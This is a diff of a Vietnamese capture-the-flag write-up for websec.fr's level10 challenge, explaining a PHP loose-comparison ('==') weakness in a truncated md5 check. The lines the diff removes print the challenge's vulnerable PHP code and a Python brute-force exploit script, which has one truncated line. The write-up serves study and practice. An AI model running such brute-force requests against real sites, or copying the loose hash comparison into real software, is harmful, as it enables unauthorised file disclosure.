@@ -5,25 +5,7 @@ Chủ đề của bài viết này chính là challenge level10 của websec.fr
 
 Khi truy cập vào challenge, ta được cung cấp source của file index.php.
 
-```php
-<?php
-        if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
-            $file = $_REQUEST['f'];
-            $request = $_REQUEST['hash'];
-
-            $hash = substr (md5 ($flag . $file . $flag), 0, 8);
-
-            echo '<div class="row"><br><pre>';
-            if ($request == $hash) {
-            show_source ($file);
-            } else {
-            echo 'Permission denied!';
-            }
-            echo '</pre></div>';
-        }
-  ?>
-
-```
+![image](https://user-images.githubusercontent.com/75677317/195742945-da56ef56-20fa-48a1-935b-1045c1edb669.png)
 
 Đầu tiên biến $hash sẽ được gán bởi giá trị của hàm md5().
 
@@ -37,25 +19,7 @@ Ta có liên tục thêm './' vào trước 'flag.php' thông qua param 'f' củ
 
 Mình sẽ viết script để exploit bằng python
 
-```python
-import requests
-
-burp0_url = "https://websec.fr:443/level10/index.php"
-burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"", "Sec-Ch-Ua-Mobile": ">
-filename = "flag.php"
-i = 1
-while True:
-     burp0_data = {"f":filename, "hash": "0"}
-     r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
-     if "Permission denied!" not in r.text:
-          print(r.text)
-          break
-     else:
-          print("Test: ", i)
-     filename = "." + "/"*i + "flag.php"
-     i = i + 1
-
-```
+![image](https://user-images.githubusercontent.com/75677317/195743096-5481fccf-d014-483f-ac13-a5b9b598f4f9.png)
 
 Brute-force sẽ hơi mất nhiều thời gian, nhưng chờ đợi là hạnh phúc :DD
 
